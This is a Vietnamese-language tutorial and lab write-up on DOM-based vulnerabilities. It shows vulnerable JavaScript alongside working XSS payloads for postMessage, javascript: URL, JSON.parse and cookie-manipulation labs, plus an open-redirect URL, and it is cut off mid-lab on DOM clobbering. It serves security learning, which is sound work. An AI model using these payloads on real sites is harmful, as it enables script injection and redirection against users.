# DOM-based vulnerabilities
## Khái niệm
**Document Object Model** (DOM), hay dịch đại khái là "Mô hình vật thể hoá tài liệu", là một model dưới dạng cây biểu thị mối quan hệ, thuộc tính và nội dung của trang HTML mà Browser có thể nhận và hiểu được. DOM được thiết kế cho phép ta có thể tương tác trực tiếp với cấu trúc bằng JavaScript với kết quả được hiển thị ngay lập tức mà không cần reload, đây là đặc tính của DOM chứ không phải lỗ hỏng. 

Lỗ hỏng của DOM nằm ở cách thức JavaScript xử lý dữ liệu. Vì DOM nằm hoàn toàn ở phía client, nên mọi thay đổi ở Source Code đều chỉ có user thấy. Điều đó nghĩa là nếu các hàm JavaScript nếu không xử lý dữ liệu cẩn thận, attacker có thể kiểm soát luồng dữ liệu thực thi của trang web. Lỗ hỏng này sẽ có chút tương đồng với SQL Injection và OS command Injection về mặt kỹ thuật.

Cách thức inject payload trong lỗ hỏng của DOM có thể được mô tả dưới 2 khái niệm là `source` và `sinks`, với `source` đóng vai trò là nơi attacker có thể kiếm soát input, còn `sinks` là vị trí lỗ hỏng thực thi payload của attacker. Lý do cho khái niệm này ra đời là vì đây là lỗ hỏng phía client, nên server sẽ không thể biết data chứa payload độc, nên họ tạo ra khái niệm dòng chảy này để mô tả cho lỗ hỏng này.

## Lab
### Lab: DOM XSS using web messages
```JavaScript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
``` 
Lỗ hỏng ở đoạn code này nằm ở việc nó nhận trực tiếp dữ liệu gửi thông qua event "Message", khi mà dữ liệu từ đó được đẩy thẳng vào id 'ads' mà không qua xử lý. Từ đây, ta có thể tạo payload để gửi đến nạn nhân
```HTML
<iframe src="<lab-ID>" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```    

Chức năng postMessage sẽ gửi mã độc tới event "Message", khiến cho trang web nạn nhân tự động trigger đoạn mã khi load trang web.

### Lab: DOM XSS using web messages and a JavaScript URL
```JS
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

Lố hỏng của đoạn code này nằm ở việc: Mặc dù đã kiểm tra sự xuất hiện của `http:` hay `https:` nằm trong data, nhưng không kiểm tra chính xác vị trí của nó, nên ta có thể thêm `http:` hay `https:` ở phần comment để thực thi Javascript code:

```HTML
<iframe src="https://<Lab-ID>" onload='this.contentWindow.postMessage("javascript:print()//https:","*")'>
```
### Lab: DOM XSS using web messages and JSON.parse
```JS
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

Lỗ hỏng của đoạn code này nằm ở việc không kiểm tra URL được gửi qua message, attacker có thể dễ dàng chèn code JavaScript thay thế cho URL:

```HTML
<iframe src="https://<Lab-ID>" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}", "*")'>
```

### Lab: DOM-based open redirection
```HTML
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
</div>
```

Lỗ hỏng của đoạn code này nằm ở param `url` khi nó cho phép redirect toàn bộ link có cấu trúc `https: + domain`. Khi này, ta có thể thay đổi param `url` để nó trỏ tới domain server attacker:

```https://<Lab-ID>/post?postId=8&url=https://<Server-ID>```

### Lab: DOM-based cookie manipulation
```HTML
<script>
    document.cookie = 'lastViewedProduct=' + window.location + ' SameSite=None; Secure'
</script>
```

Lỗ hỏng ở đây nằm ở việc đoạn code không kiểm tra cookie mà lấy trực tiếp dữ liệu (là trang web đã truy cập trước đó). Ta có thể kiểm soát cookie này bằng cách xây dựng payload sao cho ngoài việc truy cập trang web, ta trigger XSS song song với đó.

```HTML
<iframe src="https://<Lab-ID>/product?productId=2&'><script>print()</script>" onload="if(!window.x)this.src='https://<Lab-ID>';window.x=1;">
```

### Lab: Exploiting DOM clobbering to enable XSS
Lỗ hỏng của lab này nằm ở cách mà hệ thống xử lý comment. Cụ thể, lỗ hỏng nằm trong file `loadCommentsWithDomClobbering.js`:
```JS
...
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
...
```

Object `defaultAvatar` không được handle bởi bất cứ hàm kiểm tra nào, tạo ra lỗ hỏng mà attacker có thể khai thác. Bên cạnh đó, vì phần comment cho phép sử dụng HTML, nên ta có thể viết đè chức năng lên object:

